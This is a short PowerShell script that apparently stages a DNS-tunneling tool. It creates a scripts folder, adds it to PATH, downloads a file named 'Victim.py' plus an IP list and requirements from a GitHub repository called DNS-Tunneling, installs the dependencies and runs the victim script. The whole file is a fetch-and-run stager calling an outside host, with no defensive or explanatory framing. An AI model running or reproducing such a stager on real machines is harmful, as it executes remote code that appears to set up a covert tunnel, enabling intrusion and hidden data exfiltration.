mkdir C:\scripts
$env:Path += ';C:\scripts'
cd C:\scripts

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/Victim.py","C:\scripts\v.py")
$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/ip.txt","C:\scripts\ip.txt")
$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/requirements.txt","C:\scripts\requirements.txt")

python -m venv env
.\env\Scripts\Activate.ps1

pip install -r requirements.txt

python v.py